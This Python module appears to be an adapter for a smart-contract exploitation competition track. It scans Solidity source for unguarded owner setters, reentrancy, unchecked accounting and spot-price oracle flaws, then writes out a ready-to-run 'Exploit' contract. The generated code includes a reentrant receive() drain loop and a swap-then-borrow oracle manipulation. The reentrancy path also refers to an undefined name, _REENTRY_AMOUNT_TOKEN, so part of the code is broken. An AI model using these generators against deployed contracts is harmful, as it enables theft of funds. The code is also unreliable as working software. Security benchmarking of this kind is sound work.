# ruff: noqa: E501
"""Official TRUST404 Track 04 compatibility adapter.

This module deliberately keeps organizer input/output semantics at the boundary.
The existing QProver search engine is imported lazily so manifest/source parsing
remains usable in minimal environments.
"""

from __future__ import annotations

import itertools
import json
import re
from collections.abc import Iterable, Mapping, Sequence
from dataclasses import dataclass
from pathlib import Path

OFFICIAL_SCHEMA = "trust404.track04.manifest/0.1"
SELF_ADDRESS = "__QPROVER_SELF__"
OTHER_ADDRESS = "__QPROVER_OTHER__"
TARGET_ADDRESS = "__QPROVER_TARGET__"
EXIT_FOUND = 0
EXIT_NOT_FOUND = 1
EXIT_ERROR = 2


class ManifestContractError(ValueError):
    """Organizer manifest violates the Track 04 v0.1 contract."""


def _mapping(value: object, label: str) -> Mapping[str, object]:
    if not isinstance(value, dict):
        raise ManifestContractError(f"{label} must be an object")
    if any(type(key) is not str for key in value):
        raise ManifestContractError(f"{label} keys must be strings")
    return value


def _string(value: object, label: str, *, allow_empty: bool = False) -> str:
    if type(value) is not str or (not allow_empty and not value):
        raise ManifestContractError(f"{label} must be a nonempty string")
    return value


def _positive_int(value: object, label: str) -> int:
    if type(value) is not int or value <= 0:
        raise ManifestContractError(f"{label} must be a positive integer")
    return value


def _nonnegative_int(value: object, label: str) -> int:
    if type(value) is not int or value < 0:
        raise ManifestContractError(f"{label} must be a nonnegative integer")
    return value


@dataclass(frozen=True, slots=True)
class Track04Manifest:
    schema: str
    target_name: str
    target_src: str
    solc: str
    evm_version: str
    deploy_mode: str
    constructor_args: tuple[object, ...]
    deploy_value_wei: int
    setup: str | None
    block_number: int
    block_timestamp: int
    manifest_seed: int
    invariants_contract: str
    predicates: tuple[str, ...]
    timeout_sec: int
    max_attempts: int
    path: Path

    @classmethod
    def load(cls, path: Path | str) -> Track04Manifest:
        manifest_path = Path(path).resolve()
        try:
            raw = json.loads(manifest_path.read_text(encoding="utf-8"))
        except (OSError, json.JSONDecodeError) as error:
            raise ManifestContractError(f"manifest parse failed: {error}") from error
        root = _mapping(raw, "manifest")
        schema = _string(root.get("schema"), "schema")
        if schema != OFFICIAL_SCHEMA:
            raise ManifestContractError(
                f"unsupported schema {schema!r}; expected {OFFICIAL_SCHEMA!r}"
            )

        target = _mapping(root.get("target"), "target")
        deploy = _mapping(root.get("deploy"), "deploy")
        determinism = _mapping(root.get("determinism"), "determinism")
        invariants = _mapping(root.get("invariants"), "invariants")
        budget = _mapping(root.get("budget"), "budget")

        deploy_mode = _string(deploy.get("mode"), "deploy.mode")
        if deploy_mode != "local":
            raise ManifestContractError("deploy.mode must be 'local' for Track 04")

        constructor_args_raw = deploy.get("constructor_args")
        if not isinstance(constructor_args_raw, list):
            raise ManifestContractError("deploy.constructor_args must be an array")

        value_text = _string(deploy.get("value_wei"), "deploy.value_wei")
        if not value_text.isdecimal():
            raise ManifestContractError("deploy.value_wei must be a decimal string")
        deploy_value_wei = int(value_text)
        if deploy_value_wei >= 1 << 256:
            raise ManifestContractError("deploy.value_wei exceeds uint256")

        predicates_raw = invariants.get("predicates")
        if not isinstance(predicates_raw, list) or not predicates_raw:
            raise ManifestContractError(
                "invariants.predicates must be a nonempty array"
            )
        if any(type(item) is not str or not item for item in predicates_raw):
            raise ManifestContractError(
                "invariants.predicates must contain nonempty strings"
            )
        if len(set(predicates_raw)) != len(predicates_raw):
            raise ManifestContractError(
                "invariants.predicates must not contain duplicates"
            )

        setup_raw = deploy.get("setup")
        setup = None if setup_raw is None else _string(setup_raw, "deploy.setup")

        return cls(
            schema=schema,
            target_name=_string(target.get("name"), "target.name"),
            target_src=_string(target.get("src"), "target.src"),
            solc=_string(target.get("solc"), "target.solc"),
            evm_version=_string(target.get("evm_version"), "target.evm_version"),
            deploy_mode=deploy_mode,
            constructor_args=tuple(constructor_args_raw),
            deploy_value_wei=deploy_value_wei,
            setup=setup,
            block_number=_nonnegative_int(
                determinism.get("block_number"), "determinism.block_number"
            ),
            block_timestamp=_nonnegative_int(
                determinism.get("block_timestamp"), "determinism.block_timestamp"
            ),
            manifest_seed=_nonnegative_int(determinism.get("seed"), "determinism.seed"),
            invariants_contract=_string(
                invariants.get("contract"), "invariants.contract"
            ),
            predicates=tuple(predicates_raw),
            timeout_sec=_positive_int(budget.get("timeout_sec"), "budget.timeout_sec"),
            max_attempts=_positive_int(
                budget.get("max_attempts"), "budget.max_attempts"
            ),
            path=manifest_path,
        )


@dataclass(frozen=True, slots=True)
class SolidityParameter:
    name: str
    abi_type: str


@dataclass(frozen=True, slots=True)
class SolidityFunction:
    name: str
    params: tuple[SolidityParameter, ...]
    modifiers: str
    body: str
    header: str
    payable: bool
    state_changing: bool
    visible: bool

    @property
    def param_types(self) -> tuple[str, ...]:
        return tuple(param.abi_type for param in self.params)

    @property
    def signature(self) -> str:
        return f"{self.name}({','.join(self.param_types)})"


@dataclass(frozen=True, slots=True)
class SolidityScan:
    contract_name: str
    contract_body: str
    functions: tuple[SolidityFunction, ...]
    full_source: str


_CONTRACT_HEAD = re.compile(r"\bcontract\s+([A-Za-z_][A-Za-z0-9_]*)\b[^\{]*\{")
_FUNCTION_HEAD = re.compile(
    r"\bfunction\s+([A-Za-z_][A-Za-z0-9_]*)\s*\((.*?)\)\s*([^;\{]*)\{",
    re.DOTALL,
)


def _block_from_open_brace(source: str, opening: int) -> tuple[str, int]:
    depth = 0
    string_quote: str | None = None
    escape = False
    line_comment = False
    block_comment = False
    index = opening
    while index < len(source):
        ch = source[index]
        nxt = source[index + 1] if index + 1 < len(source) else ""
        if line_comment:
            if ch == "\n":
                line_comment = False
            index += 1
            continue
        if block_comment:
            if ch == "*" and nxt == "/":
                block_comment = False
                index += 2
                continue
            index += 1
            continue
        if string_quote is not None:
            if escape:
                escape = False
            elif ch == "\\":
                escape = True
            elif ch == string_quote:
                string_quote = None
            index += 1
            continue
        if ch == "/" and nxt == "/":
            line_comment = True
            index += 2
            continue
        if ch == "/" and nxt == "*":
            block_comment = True
            index += 2
            continue
        if ch in {'"', "'"}:
            string_quote = ch
            index += 1
            continue
        if ch == "{":
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0:
                return source[opening : index + 1], index + 1
        index += 1
    raise ValueError("unterminated Solidity block")


def _split_top_level(text: str) -> tuple[str, ...]:
    if not text.strip():
        return ()
    parts: list[str] = []
    start = 0
    depth = 0
    for index, ch in enumerate(text):
        if ch in "([":
            depth += 1
        elif ch in ")]":
            depth = max(0, depth - 1)
        elif ch == "," and depth == 0:
            parts.append(text[start:index].strip())
            start = index + 1
    parts.append(text[start:].strip())
    return tuple(part for part in parts if part)


def _canonical_param_type(raw: str) -> tuple[str, str]:
    tokens = raw.replace("\n", " ").split()
    if not tokens:
        raise ValueError("empty Solidity parameter")
    qualifiers = {"memory", "calldata", "storage", "indexed"}
    tokens = [token for token in tokens if token not in qualifiers]
    if not tokens:
        raise ValueError("empty Solidity parameter")
    if len(tokens) >= 2 and tokens[0] == "address" and tokens[1] == "payable":
        abi_type = "address"
        remaining = tokens[2:]
    else:
        abi_type = tokens[0]
        remaining = tokens[1:]
    if abi_type == "uint":
        abi_type = "uint256"
    elif abi_type == "int":
        abi_type = "int256"
    name = remaining[-1] if remaining else "arg"
    return abi_type, name


def _extract_named_contract(source: str, contract_name: str) -> str:
    for match in _CONTRACT_HEAD.finditer(source):
        if match.group(1) != contract_name:
            continue
        opening = source.find("{", match.start(), match.end())
        if opening < 0:
            break
        block, _ = _block_from_open_brace(source, opening)
        return block
    raise ValueError(f"contract {contract_name!r} not found in target source")


def scan_target(source: str, target_name: str) -> SolidityScan:
    contract_body = _extract_named_contract(source, target_name)
    functions: list[SolidityFunction] = []
    for match in _FUNCTION_HEAD.finditer(contract_body):
        name = match.group(1)
        params_raw = match.group(2)
        modifiers = " ".join(match.group(3).split())
        opening = match.end() - 1
        body, _ = _block_from_open_brace(contract_body, opening)
        visible = bool(re.search(r"\b(?:external|public)\b", modifiers))
        state_changing = not bool(re.search(r"\b(?:view|pure)\b", modifiers))
        if not visible or not state_changing:
            continue
        params: list[SolidityParameter] = []
        for raw_param in _split_top_level(params_raw):
            abi_type, param_name = _canonical_param_type(raw_param)
            params.append(SolidityParameter(name=param_name, abi_type=abi_type))
        functions.append(
            SolidityFunction(
                name=name,
                params=tuple(params),
                modifiers=modifiers,
                body=body,
                header=match.group(0),
                payable=bool(re.search(r"\bpayable\b", modifiers)),
                state_changing=state_changing,
                visible=visible,
            )
        )
    return SolidityScan(
        contract_name=target_name,
        contract_body=contract_body,
        functions=tuple(functions),
        full_source=source,
    )


@dataclass(frozen=True, slots=True)
class Track04Action:
    id: str
    kind: str
    signature: str
    function_name: str | None
    param_types: tuple[str, ...]
    payable: bool
    utility: float
    details: tuple[tuple[str, object], ...] = ()

    def detail(self, key: str, default: object = None) -> object:
        for item_key, value in self.details:
            if item_key == key:
                return value
        return default


@dataclass(frozen=True, slots=True)
class Track04Variant:
    action_id: str
    signature: str
    args: tuple[object, ...]
    value_wei: int
    max_repetitions: int = 2


@dataclass(frozen=True, slots=True)
class Track04SearchBlueprint:
    actions: tuple[Track04Action, ...]
    variants: tuple[Track04Variant, ...]
    utilities: Mapping[str, float]
    transitions: Mapping[tuple[str, str], float]
    hypothesis_sequences: tuple[tuple[str, ...], ...]
    max_sequence_length: int

    def action(self, action_id: str) -> Track04Action:
        for action in self.actions:
            if action.id == action_id:
                return action
        raise KeyError(action_id)


_STATE_DECL_PATTERNS = (
    re.compile(
        r"\bmapping\s*\([^;]+?\)\s+(?:public\s+|private\s+|internal\s+)?([A-Za-z_]\w*)\s*;"
    ),
    re.compile(
        r"\b(?:address|bool|bytes(?:[0-9]+)?|u?int(?:[0-9]+)?|[A-Z][A-Za-z0-9_]*)"
        r"\s+(?:(?:public|private|internal|immutable|constant)\s+)*([A-Za-z_]\w*)\s*(?:=|;)"
    ),
)


def _state_identifiers(contract_body: str) -> tuple[str, ...]:
    names: set[str] = set()
    for pattern in _STATE_DECL_PATTERNS:
        names.update(pattern.findall(contract_body))
    return tuple(sorted(names))


def _invariant_getters(invariants_source: str) -> frozenset[str]:
    return frozenset(
        re.findall(
            r"\bfunction\s+([A-Za-z_]\w*)\s*\([^)]*\)\s+external\s+view",
            invariants_source,
        )
    )


def _has_sender_guard(function: SolidityFunction) -> bool:
    text = f"{function.modifiers}\n{function.body}"
    modifier_tokens = set(re.findall(r"\b([A-Za-z_]\w*)\b", function.modifiers))
    if any(token.lower().startswith("only") for token in modifier_tokens):
        return True
    guard_patterns = (
        r"require\s*\(\s*msg\.sender\s*==",
        r"require\s*\([^;]*==\s*msg\.sender",
        r"if\s*\(\s*msg\.sender\s*!=",
        r"if\s*\([^;]*!=\s*msg\.sender",
    )
    return any(re.search(pattern, text) for pattern in guard_patterns)


def _external_value_call_position(body: str) -> int:
    positions = [
        position
        for marker in (".call{value:", ".call.value(", ".transfer(", ".send(")
        if (position := body.find(marker)) >= 0
    ]
    return min(positions) if positions else -1


def _state_write_positions(body: str, state_names: Iterable[str]) -> tuple[int, ...]:
    positions: list[int] = []
    for name in state_names:
        pattern = re.compile(
            rf"\b{re.escape(name)}(?:\s*\[[^\]]+\])?\s*(?:=|\+=|-=|\+\+|--)"
        )
        positions.extend(match.start() for match in pattern.finditer(body))
        delete_pattern = re.compile(rf"\bdelete\s+{re.escape(name)}\b")
        positions.extend(match.start() for match in delete_pattern.finditer(body))
    return tuple(sorted(positions))


def _is_reentrancy_shape(
    function: SolidityFunction, state_names: Iterable[str]
) -> bool:
    call_position = _external_value_call_position(function.body)
    if call_position < 0:
        return False
    if re.search(r"\bnonReentrant\b", function.modifiers):
        return False
    writes = _state_write_positions(function.body, state_names)
    return any(position > call_position for position in writes)


def _utility(
    function: SolidityFunction,
    *,
    state_names: tuple[str, ...],
    invariant_getters: frozenset[str],
) -> float:
    body = function.body
    score = 0.15
    guarded = _has_sender_guard(function)
    value_call = _external_value_call_position(body) >= 0
    unchecked_subtraction = "unchecked" in body and ("-=" in body or " - " in body)
    owner_write = bool(
        re.search(r"\b(?:owner|admin|governor|guardian)\w*\s*=", body, re.IGNORECASE)
    )
    self_accounting_value_call = bool(
        value_call
        and re.search(r"msg\.sender\.call\{value:", body)
        and re.search(r"\[[^\]]*msg\.sender[^\]]*\]", body)
        and ("require(" in body or "-=" in body)
    )
    arbitrary_recipient_value_call = bool(
        value_call
        and re.search(r"\b[A-Za-z_]\w*\.call\{value:", body)
        and not re.search(r"msg\.sender\.call\{value:", body)
    )
    if value_call:
        score += 0.25
    if value_call and not guarded:
        score += 0.25
    if arbitrary_recipient_value_call and not guarded:
        score += 0.15
    if self_accounting_value_call:
        score -= 0.10
    if owner_write:
        score += 0.25
    if owner_write and not guarded:
        score += 0.20
    if unchecked_subtraction:
        score += 0.35
    if function.payable:
        score += 0.05
    referenced_state = {
        name for name in state_names if re.search(rf"\b{re.escape(name)}\b", body)
    }
    if referenced_state & invariant_getters:
        score += 0.10
    if guarded:
        score -= 0.15
    return round(max(0.05, min(1.0, score)), 6)


def _abi_values(abi_type: str, manifest: Track04Manifest) -> tuple[object, ...]:
    if re.fullmatch(r"uint(?:[0-9]+)?", abi_type):
        width_text = abi_type[4:]
        width = int(width_text) if width_text else 256
        maximum = (1 << width) - 1
        values = [0, 1, 10**18]
        if manifest.deploy_value_wei:
            values.extend([manifest.deploy_value_wei // 2, manifest.deploy_value_wei])
        values.append(maximum)
        return tuple(dict.fromkeys(value for value in values if 0 <= value <= maximum))
    if re.fullmatch(r"int(?:[0-9]+)?", abi_type):
        return (0, 1, -1)
    if abi_type == "address":
        return (SELF_ADDRESS, OTHER_ADDRESS)
    if abi_type == "bool":
        return (False, True)
    if abi_type == "bytes32":
        return ("0x" + "00" * 32,)
    if abi_type == "bytes":
        return ("0x",)
    if abi_type == "string":
        return ("",)
    return ()


def _direct_variants(
    action_id: str,
    function: SolidityFunction,
    manifest: Track04Manifest,
    *,
    cap: int = 12,
) -> tuple[Track04Variant, ...]:
    domains = [_abi_values(param.abi_type, manifest) for param in function.params]
    if any(not domain for domain in domains):
        return ()
    argument_products: Iterable[tuple[object, ...]] = (
        itertools.product(*domains) if domains else ((),)
    )
    values = (0, min(10**18, 10 * 10**18)) if function.payable else (0,)
    variants: list[Track04Variant] = []
    for args in argument_products:
        for value in values:
            variants.append(
                Track04Variant(
                    action_id=action_id,
                    signature=function.signature,
                    args=tuple(args),
                    value_wei=value,
                    max_repetitions=2,
                )
            )
            if len(variants) >= cap:
                return tuple(variants)
    return tuple(variants)


def _function_state_refs(
    function: SolidityFunction, state_names: tuple[str, ...]
) -> frozenset[str]:
    return frozenset(
        name
        for name in state_names
        if re.search(rf"\b{re.escape(name)}\b", function.body)
    )


def _unchecked_accounting_macro(
    functions: tuple[SolidityFunction, ...],
    state_names: tuple[str, ...],
    amount_wei: int,
) -> tuple[Track04Action, ...]:
    actions: list[Track04Action] = []
    for source in functions:
        if "unchecked" not in source.body or "-=" not in source.body:
            continue
        source_refs = _function_state_refs(source, state_names)
        if not source_refs:
            continue
        for sink in functions:
            if source is sink or _external_value_call_position(sink.body) < 0:
                continue
            if not source_refs & _function_state_refs(sink, state_names):
                continue
            # The generic renderer currently supports the common two-argument
            # credit transfer followed by a one-uint redemption sink.
            if source.param_types != ("address", "uint256"):
                continue
            if sink.param_types != ("uint256",):
                continue
            action_id = f"macro:unchecked-accounting:{source.name}:{sink.name}"
            actions.append(
                Track04Action(
                    id=action_id,
                    kind="unchecked_accounting",
                    signature=action_id,
                    function_name=None,
                    param_types=(),
                    payable=False,
                    utility=10.0,
                    details=(
                        ("source_signature", source.signature),
                        ("sink_signature", sink.signature),
                        ("amount_wei", amount_wei),
                    ),
                )
            )
    return tuple(actions)


def _access_control_macros(
    functions: tuple[SolidityFunction, ...],
) -> tuple[Track04Action, ...]:
    macros: list[Track04Action] = []
    for function in functions:
        if _has_sender_guard(function) or function.param_types != ("address",):
            continue
        if not re.search(
            r"\b(?:owner|admin|governor|guardian)\w*\s*=",
            function.body,
            re.IGNORECASE,
        ):
            continue
        action_id = f"macro:access-control:{function.name}"
        macros.append(
            Track04Action(
                id=action_id,
                kind="access_control",
                signature=action_id,
                function_name=None,
                param_types=(),
                payable=False,
                utility=10.0,
                details=(("call_signature", function.signature),),
            )
        )
    return tuple(macros)


def _reentrancy_macros(
    functions: tuple[SolidityFunction, ...], state_names: tuple[str, ...]
) -> tuple[Track04Action, ...]:
    funding = next(
        (
            function
            for function in functions
            if function.payable and len(function.params) == 0
        ),
        None,
    )
    if funding is None:
        return ()
    macros: list[Track04Action] = []
    for function in functions:
        if not _is_reentrancy_shape(function, state_names):
            continue
        if function.param_types not in ((), ("uint256",)):
            continue
        action_id = f"macro:reentrancy:{function.name}"
        macros.append(
            Track04Action(
                id=action_id,
                kind="reentrancy",
                signature=action_id,
                function_name=None,
                param_types=(),
                payable=False,
                utility=10.0,
                details=(
                    ("funding_signature", funding.signature),
                    ("vulnerable_signature", function.signature),
                ),
            )
        )
    return tuple(macros)


def build_search_blueprint(
    target_source: str,
    invariants_source: str,
    manifest: Track04Manifest,
) -> Track04SearchBlueprint:
    scan = scan_target(target_source, manifest.target_name)
    state_names = _state_identifiers(scan.contract_body)
    invariant_getters = _invariant_getters(invariants_source)
    direct_actions: list[Track04Action] = []
    variants: list[Track04Variant] = []
    utilities: dict[str, float] = {}

    for function in scan.functions:
        action_id = f"call:{function.signature}"
        utility = _utility(
            function,
            state_names=state_names,
            invariant_getters=invariant_getters,
        )
        action_variants = _direct_variants(action_id, function, manifest)
        if not action_variants:
            continue
        action = Track04Action(
            id=action_id,
            kind="direct",
            signature=function.signature,
            function_name=function.name,
            param_types=function.param_types,
            payable=function.payable,
            utility=utility,
        )
        direct_actions.append(action)
        variants.extend(action_variants)
        utilities[action_id] = utility

    macros = (
        *_access_control_macros(scan.functions),
        *_reentrancy_macros(scan.functions, state_names),
        *_unchecked_accounting_macro(
            scan.functions,
            state_names,
            manifest.deploy_value_wei or 10**18,
        ),
        *_spot_price_oracle_macros(scan),
    )
    for macro in macros:
        direct_actions.append(macro)
        utilities[macro.id] = macro.utility
        variants.append(
            Track04Variant(
                action_id=macro.id,
                signature=macro.signature,
                args=(),
                value_wei=0,
                max_repetitions=1,
            )
        )

    refs = {
        function.name: _function_state_refs(function, state_names)
        for function in scan.functions
    }
    transitions: dict[tuple[str, str], float] = {}
    for first in scan.functions:
        first_id = f"call:{first.signature}"
        if first_id not in utilities:
            continue
        for second in scan.functions:
            second_id = f"call:{second.signature}"
            if second_id not in utilities or first is second:
                continue
            shared = refs[first.name] & refs[second.name]
            if not shared:
                continue
            benefit = 0.15
            if "unchecked" in first.body and "-=" in first.body:
                benefit += 0.45
            if _external_value_call_position(second.body) >= 0:
                benefit += 0.30
            transitions[(first_id, second_id)] = round(min(1.0, benefit), 6)

    hypotheses: list[tuple[str, ...]] = []
    hypotheses.extend((macro.id,) for macro in macros)
    for (first, second), benefit in sorted(transitions.items()):
        if benefit >= 0.75:
            hypotheses.append((first, second))

    actions = tuple(sorted(direct_actions, key=lambda item: item.id))
    variants_tuple = tuple(
        sorted(
            variants,
            key=lambda item: (
                item.action_id,
                repr(item.args),
                item.value_wei,
            ),
        )
    )
    return Track04SearchBlueprint(
        actions=actions,
        variants=variants_tuple,
        utilities={key: utilities[key] for key in sorted(utilities)},
        transitions={key: transitions[key] for key in sorted(transitions)},
        hypothesis_sequences=tuple(sorted(set(hypotheses))),
        max_sequence_length=3,
    )


_CUSTOM_STATE_CONTRACT = re.compile(
    r"\b([A-Z][A-Za-z0-9_]*)\s+"
    r"(?:(?:public|private|internal|immutable)\s+)*([A-Za-z_]\w*)\s*;"
)


def _all_contract_functions(
    source: str, contract_name: str
) -> tuple[SolidityFunction, ...]:
    contract_body = _extract_named_contract(source, contract_name)
    functions: list[SolidityFunction] = []
    for match in _FUNCTION_HEAD.finditer(contract_body):
        name = match.group(1)
        modifiers = " ".join(match.group(3).split())
        opening = match.end() - 1
        body, _ = _block_from_open_brace(contract_body, opening)
        params: list[SolidityParameter] = []
        for raw_param in _split_top_level(match.group(2)):
            abi_type, param_name = _canonical_param_type(raw_param)
            params.append(SolidityParameter(name=param_name, abi_type=abi_type))
        functions.append(
            SolidityFunction(
                name=name,
                params=tuple(params),
                modifiers=modifiers,
                body=body,
                header=match.group(0),
                payable=bool(re.search(r"\bpayable\b", modifiers)),
                state_changing=not bool(re.search(r"\b(?:view|pure)\b", modifiers)),
                visible=bool(re.search(r"\b(?:external|public)\b", modifiers)),
            )
        )
    return tuple(functions)


def _custom_state_contracts(contract_body: str) -> Mapping[str, str]:
    return {
        variable: contract_type
        for contract_type, variable in _CUSTOM_STATE_CONTRACT.findall(contract_body)
    }


def _spot_price_oracle_macros(scan: SolidityScan) -> tuple[Track04Action, ...]:
    custom_types = _custom_state_contracts(scan.contract_body)
    if not custom_types:
        return ()

    faucet = next(
        (
            function
            for function in scan.functions
            if not function.params
            and re.search(r"\.mint\s*\(\s*msg\.sender\s*,", function.body)
        ),
        None,
    )
    deposit = next(
        (
            function
            for function in scan.functions
            if function.param_types == ("uint256",)
            and re.search(
                r"\b([A-Za-z_]\w*)\.transferFrom\s*\(\s*msg\.sender\s*,\s*address\s*\(\s*this\s*\)",
                function.body,
            )
        ),
        None,
    )
    borrow = next(
        (
            function
            for function in scan.functions
            if function.param_types == ("uint256",)
            and re.search(r"\b([A-Za-z_]\w*)\.spotPrice\s*\(\s*\)", function.body)
            and re.search(
                r"\b([A-Za-z_]\w*)\.transfer\s*\(\s*msg\.sender\s*,", function.body
            )
        ),
        None,
    )
    if faucet is None or deposit is None or borrow is None:
        return ()

    collateral_match = re.search(
        r"\b([A-Za-z_]\w*)\.transferFrom\s*\(\s*msg\.sender\s*,\s*address\s*\(\s*this\s*\)",
        deposit.body,
    )
    pool_match = re.search(r"\b([A-Za-z_]\w*)\.spotPrice\s*\(\s*\)", borrow.body)
    borrow_match = re.search(
        r"\b([A-Za-z_]\w*)\.transfer\s*\(\s*msg\.sender\s*,", borrow.body
    )
    if collateral_match is None or pool_match is None or borrow_match is None:
        return ()

    collateral_var = collateral_match.group(1)
    pool_var = pool_match.group(1)
    borrow_var = borrow_match.group(1)
    if any(var not in custom_types for var in (collateral_var, pool_var, borrow_var)):
        return ()

    pool_type = custom_types[pool_var]
    try:
        pool_functions = _all_contract_functions(scan.full_source, pool_type)
    except ValueError:
        return ()
    spot = next(
        (
            function
            for function in pool_functions
            if function.name == "spotPrice" and function.visible
        ),
        None,
    )
    if spot is None:
        return ()
    price_match = re.search(
        r"return\s*\(\s*([A-Za-z_]\w*)\s*\*\s*(?:1e18|10\s*\*\*\s*18)\s*\)\s*/\s*([A-Za-z_]\w*)",
        spot.body,
    )
    if price_match is None:
        return ()
    numerator, denominator = price_match.groups()

    swap = next(
        (
            function
            for function in pool_functions
            if function.visible
            and function.state_changing
            and function.param_types == ("uint256",)
            and re.search(rf"\b{re.escape(numerator)}\s*\+=", function.body)
            and re.search(rf"\b{re.escape(denominator)}\s*-=", function.body)
        ),
        None,
    )
    if swap is None:
        return ()

    action_id = f"macro:spot-price-oracle:{pool_var}:{swap.name}"
    return (
        Track04Action(
            id=action_id,
            kind="spot_price_oracle",
            signature=action_id,
            function_name=None,
            param_types=(),
            payable=False,
            utility=10.0,
            details=(
                ("collateral_getter", f"{collateral_var}()"),
                ("borrow_getter", f"{borrow_var}()"),
                ("pool_getter", f"{pool_var}()"),
                ("faucet_signature", faucet.signature),
                ("deposit_signature", deposit.signature),
                ("borrow_signature", borrow.signature),
                ("swap_signature", swap.signature),
            ),
        ),
    )


def _solidity_literal(value: object) -> str:
    if value == SELF_ADDRESS:
        return "address(this)"
    if value == OTHER_ADDRESS:
        return "address(0x000000000000000000000000000000000000bEEF)"
    if value == TARGET_ADDRESS:
        return "target"
    if type(value) is bool:
        return "true" if value else "false"
    if type(value) is int:
        return str(value)
    if isinstance(value, str) and re.fullmatch(r"0x[0-9a-fA-F]*", value):
        return f'hex"{value[2:]}"'
    if isinstance(value, str):
        escaped = value.replace("\\", "\\\\").replace('"', '\\"')
        return f'"{escaped}"'
    raise ValueError(f"unsupported Solidity literal: {value!r}")


def _encode_signature(signature: str, args: Sequence[object]) -> str:
    rendered = ", ".join(_solidity_literal(value) for value in args)
    if rendered:
        return f'abi.encodeWithSignature("{signature}", {rendered})'
    return f'abi.encodeWithSignature("{signature}")'


def _macro_unchecked_lines(action: Track04Action) -> list[str]:
    source_signature = str(action.detail("source_signature"))
    sink_signature = str(action.detail("sink_signature"))
    amount = int(action.detail("amount_wei", 10**18))
    return [
        "_mustCall(target, 0, "
        + _encode_signature(source_signature, (OTHER_ADDRESS, amount))
        + ");",
        "_mustCall(target, 0, " + _encode_signature(sink_signature, (amount,)) + ");",
    ]


def _macro_oracle_lines(action: Track04Action) -> list[str]:
    collateral_getter = str(action.detail("collateral_getter"))
    borrow_getter = str(action.detail("borrow_getter"))
    pool_getter = str(action.detail("pool_getter"))
    faucet = str(action.detail("faucet_signature"))
    deposit = str(action.detail("deposit_signature"))
    borrow = str(action.detail("borrow_signature"))
    swap = str(action.detail("swap_signature"))
    return [
        f'address collateral = _readAddress(target, abi.encodeWithSignature("{collateral_getter}"));',
        f'address borrowAsset = _readAddress(target, abi.encodeWithSignature("{borrow_getter}"));',
        f'address pool = _readAddress(target, abi.encodeWithSignature("{pool_getter}"));',
        "_mustCall(target, 0, " + _encode_signature(faucet, ()) + ");",
        "uint256 borrowBalance = _balanceOf(borrowAsset, address(this));",
        '_mustCall(borrowAsset, 0, abi.encodeWithSignature("approve(address,uint256)", pool, type(uint256).max));',
        "uint256 swapAmount = (borrowBalance * 9) / 10;",
        "_mustCall(pool, 0, " + _encode_signature(swap, ())[:-1] + ", swapAmount));"
        if swap.endswith("(uint256)")
        else "_mustCall(pool, 0, " + _encode_signature(swap, ()) + ");",
        "uint256 collateralBalance = _balanceOf(collateral, address(this));",
        '_mustCall(collateral, 0, abi.encodeWithSignature("approve(address,uint256)", target, type(uint256).max));',
        "_mustCall(target, 0, "
        + _encode_signature(deposit, ())[:-1]
        + ", collateralBalance));",
        "uint256 borrowAmount = collateralBalance * 2;",
        "_mustCall(target, 0, "
        + _encode_signature(borrow, ())[:-1]
        + ", borrowAmount));",
    ]


def render_candidate(blueprint: Track04SearchBlueprint, candidate: object) -> str:
    steps = tuple(getattr(candidate, "steps", ()))
    if not steps:
        raise ValueError("candidate must contain at least one step")
    actions = {action.id: action for action in blueprint.actions}
    reentrancy_actions = [
        actions[step.action_id]
        for step in steps
        if step.action_id in actions and actions[step.action_id].kind == "reentrancy"
    ]
    if len(reentrancy_actions) > 1:
        raise ValueError("candidate cannot contain multiple reentrancy macros")

    run_lines: list[str] = []
    for step in steps:
        action = actions.get(step.action_id)
        if action is None:
            raise ValueError(f"unknown action {step.action_id!r}")
        if action.kind == "direct":
            run_lines.append(
                f"_mustCall(target, {int(step.value_wei)}, "
                + _encode_signature(step.signature, tuple(step.args))
                + ");"
            )
        elif action.kind == "access_control":
            signature = str(action.detail("call_signature"))
            run_lines.append(
                "_mustCall(target, 0, "
                + _encode_signature(signature, (SELF_ADDRESS,))
                + ");"
            )
        elif action.kind == "unchecked_accounting":
            run_lines.extend(_macro_unchecked_lines(action))
        elif action.kind == "spot_price_oracle":
            run_lines.extend(_macro_oracle_lines(action))
        elif action.kind == "reentrancy":
            funding = str(action.detail("funding_signature"))
            vulnerable = str(action.detail("vulnerable_signature"))
            run_lines.extend(
                [
                    "_reTarget = target;",
                    "_reentryHops = 0;",
                    "_mustCall(target, _REENTRY_AMOUNT, "
                    + _encode_signature(funding, ())
                    + ");",
                    "_mustCall(target, 0, "
                    + (
                        _encode_signature(vulnerable, (_REENTRY_AMOUNT_TOKEN,))
                        if vulnerable.endswith("(uint256)")
                        else _encode_signature(vulnerable, ())
                    )
                    + ");",
                ]
            )
        else:
            raise ValueError(f"unsupported action kind {action.kind!r}")

    reentrancy_fields = ""
    receive_block = """
    receive() external payable {}
"""
    if reentrancy_actions:
        action = reentrancy_actions[0]
        vulnerable = str(action.detail("vulnerable_signature"))
        callback_data = (
            _encode_signature(vulnerable, (_REENTRY_AMOUNT_TOKEN,))
            if vulnerable.endswith("(uint256)")
            else _encode_signature(vulnerable, ())
        )
        callback_data = callback_data.replace(
            '"__QPROVER_REENTRY_AMOUNT__"', "_REENTRY_AMOUNT"
        )
        reentrancy_fields = """
    address private _reTarget;
    uint256 private _reentryHops;
    uint256 private constant _REENTRY_AMOUNT = 1 ether;
"""
        receive_block = f"""
    receive() external payable {{
        if (_reentryHops < 3 && _reTarget != address(0) && _reTarget.balance > 0) {{
            _reentryHops += 1;
            _mustCall(_reTarget, 0, {callback_data});
        }}
    }}
"""

    needs_oracle_helpers = any(
        actions[step.action_id].kind == "spot_price_oracle" for step in steps
    )
    oracle_helpers = ""
    if needs_oracle_helpers:
        oracle_helpers = """
    function _readAddress(address target, bytes memory callData) private returns (address value) {
        (bool ok, bytes memory data) = target.call(callData);
        require(ok && data.length >= 32, "qprover-read-address");
        value = abi.decode(data, (address));
    }

    function _balanceOf(address token, address account) private returns (uint256 value) {
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSignature("balanceOf(address)", account)
        );
        require(ok && data.length >= 32, "qprover-balanceOf");
        value = abi.decode(data, (uint256));
    }
"""

    body = "\n".join(f"        {line}" for line in run_lines)
    return f"""// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

contract Exploit {{{reentrancy_fields}
    function run(address target) external payable {{
{body}
    }}

    function _mustCall(address target, uint256 value, bytes memory data) private {{
        (bool ok,) = target.call{{value: value}}(data);
        require(ok, "qprover-call");
    }}
{oracle_helpers}{receive_block}}}
"""


